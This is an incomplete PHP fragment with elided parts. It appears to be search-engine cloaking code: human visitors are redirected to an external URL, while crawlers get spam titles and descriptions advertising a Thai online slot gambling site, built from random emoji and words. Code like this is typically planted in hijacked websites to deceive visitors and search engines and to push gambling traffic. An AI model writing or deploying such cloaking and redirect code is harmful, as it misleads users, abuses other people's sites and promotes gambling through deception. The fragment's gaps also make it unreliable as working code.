...
if (!isBot()) 
{
    ...
    header("Location: https://lpsh.net/bobbin");
    exit();
}
$BRAND   = '';
$NUMLIST = 0;
...
$title = "{$BRANDS} {$randomEmoji} {$randomWord} สมัครและเข้าสู่ระบบเว็บไซต์ PG Slot ยอดนิยมในประเทศไทยได้อย่างง่ายดาย";
$desc  = "{$BRANDS} {$randomWord} เว็บสล็อตออนไลน์อันดับ 1 รวมเกมยอดนิยมจาก PG, Joker และ Pragmatic Play พร้อมโปรโมชั่นใหญ่ สมัครวันนี้รับโบนัสทันที";
